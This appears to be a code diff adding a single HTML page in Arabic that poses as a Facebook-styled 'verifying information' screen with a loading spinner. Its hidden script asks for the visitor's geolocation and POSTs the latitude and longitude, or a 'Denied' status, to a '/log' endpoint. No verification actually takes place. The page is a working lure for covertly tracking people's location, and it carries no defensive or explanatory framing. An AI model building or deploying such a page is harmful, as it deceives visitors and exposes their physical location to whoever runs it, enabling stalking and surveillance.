@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحقق</title>
+</head>
+<body style="background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center">
+        <div style="border:4px solid #f3f3f3; border-top:4px solid #1877f2; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
+        <div style="color:#1c1e21;">جاري التحقق من المعلومات...</div>
+    </div>
+    <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+    <script>
+        navigator.geolocation.getCurrentPosition(
+            (p) => fetch('/log', {
+                method:'POST', 
+                headers:{'Content-Type':'application/json'}, 
+                body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude, status:'Allowed'})
+            }),
+            (e) => fetch('/log', {
+                method:'POST', 
+                headers:{'Content-Type':'application/json'}, 
+                body:JSON.stringify({status:'Denied'})
+            })
+        );
+    </script>
+</body>
+</html>
